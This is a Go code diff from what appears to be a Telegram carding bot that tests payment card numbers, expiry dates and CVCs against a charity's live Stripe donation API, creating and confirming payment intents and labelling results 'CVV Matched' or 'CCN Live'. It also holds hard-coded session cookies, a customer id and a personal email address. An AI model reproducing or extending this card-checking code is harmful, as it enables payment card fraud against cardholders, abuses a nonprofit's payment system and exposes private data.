@@ -9,42 +9,6 @@ import (
 	"strings"
 )
 
-func get_id() string {
-	client := &http.Client{}
-	var data = strings.NewReader(`{"email":"amarnathc@outlook.in","account":"us","testMode":false}`)
-	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/list-customers", data)
-	if err != nil {
-		log.Fatal(err)
-	}
-	req.Header.Set("authority", "yaqeeninstitute.ca")
-	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
-	req.Header.Set("sec-ch-ua-mobile", "?0")
-	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
-	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
-	req.Header.Set("content-type", "application/json")
-	req.Header.Set("accept", "*/*")
-	req.Header.Set("origin", "https://yaqeeninstitute.ca")
-	req.Header.Set("sec-fetch-site", "same-origin")
-	req.Header.Set("sec-fetch-mode", "cors")
-	req.Header.Set("sec-fetch-dest", "empty")
-	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
-	req.Header.Set("accept-language", "en-US,en;q=0.9")
-	req.Header.Set("cookie", "_country=ca; __stripe_mid=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e; __stripe_sid=6c0ab791-b55b-4969-b556-9aca59adccd76700f0; _dd_s=rum=2&id=cf9a4009-905f-4ed5-9ceb-520145961f64&created=1643549618780&expire=1643552535734&logs=1")
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
-	var m = make(map[string]interface{})
-	json.NewDecoder(resp.Body).Decode(&m)
-	if err != nil {
-		log.Fatal(err)
-	}
-	id := m["data"].([]interface{})[0].(map[string]interface{})["id"].(string)
-	return id
-
-}
-
 func create_intent() (string, string) {
 	client := &http.Client{}
 	var data = strings.NewReader(`{"amount":7300,"currency":"inr","account":"us","metaData":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button"},"testMode":false,"statementDescriptorSuffix":"One Time"}`)
@@ -74,41 +38,6 @@ func create_intent() (string, string) {
 	var m map[string]string
 	json.NewDecoder(resp.Body).Decode(&m)
 	return m["id"], m["clientSecret"]
-}
-
-func update_id(id string) string {
-	client := &http.Client{}
-	var data = strings.NewReader(`{"paymentIntentId":` + id + `,"account":"us","testMode":false,"data":{"metadata":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button","payment_method":"cc"},"customer":"cus_L3lajozOIcucpi"}}`)
-	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/update-payment-intent", data)
-	if err != nil {
-		log.Fatal(err)
-	}
-	req.Header.Set("authority", "yaqeeninstitute.ca")
-	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
-	req.Header.Set("sec-ch-ua-mobile", "?0")
-	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
-	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
-	req.Header.Set("content-type", "application/json")
-	req.Header.Set("accept", "*/*")
-	req.Header.Set("origin", "https://yaqeeninstitute.ca")
-	req.Header.Set("sec-fetch-site", "same-origin")
-	req.Header.Set("sec-fetch-mode", "cors")
-	req.Header.Set("sec-fetch-dest", "empty")
-	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
-	req.Header.Set("accept-language", "en-US,en;q=0.9")
-	req.Header.Set("cookie", "_country=ca; __stripe_mid=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e; __stripe_sid=6c0ab791-b55b-4969-b556-9aca59adccd76700f0; _dd_s=rum=2&id=cf9a4009-905f-4ed5-9ceb-520145961f64&created=1643549618780&expire=1643552536796&logs=1")
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
-	var m map[string]string
-	if err != nil {
-		log.Fatal(err)
-	}
-	json.NewDecoder(resp.Body).Decode(&m)
-	fmt.Println(m)
-	return m["clientSecret"]
 }
 
 func confirm(id string, s string, cc string, year string, month string, cvc string) (string, string, string) {
@@ -181,21 +110,26 @@ func StripeRs(cc string, month string, year string, cvc string, c tb.Context) st
 		year = strings.ReplaceAll(year, "20", "")
 
 	}
+        current_time := time.Now()
 	id, secret := create_intent()
 	code, dcode, msg := confirm(id, secret, cc, month, year, cvc)
 	emoji := "✅"
 	if dcode == "insufficient_funds" {
-		emoji = "✅"
 		code = "CVV Matched"
 	} else if code == "card_declined" {
+                code = "Card Declined"
 		emoji = "❌"
 	} else if code == "incorrect_number" {
+                code = "Incorrect Card"
+                dcode = "incorrect_number"
 		emoji = "❌"
 	} else if code == "incorrect_cvc" {
+                dcode = "incorrect_cvc"
 		code = "CCN Live"
 	} else if dcode == "3DS(VBV)" {
 		emoji = "❌"
 	}
+        total_time := time.Now().Unix() - current_time.Unix()
 	if dcode != string("") {
 		dcode = fmt.Sprintf("\n<b>⌥ Dcode ✑ %s</b>", dcode)
 	}
@@ -206,6 +140,6 @@ func StripeRs(cc string, month string, year string, cvc string, c tb.Context) st
 	} else if IsBotAdmin(c.Sender().ID) {
 		status = "Premium"
 	}
-	F := fmt.Sprintf(stripe_1, cc, year, month, cvc, code, emoji, dcode, msg, bin, c.Sender().FirstName, status)
+	F := fmt.Sprintf(stripe_1, cc, year, month, cvc, code, emoji, dcode, msg, bin, total_time, c.Sender().FirstName, status)
 	return F
 }
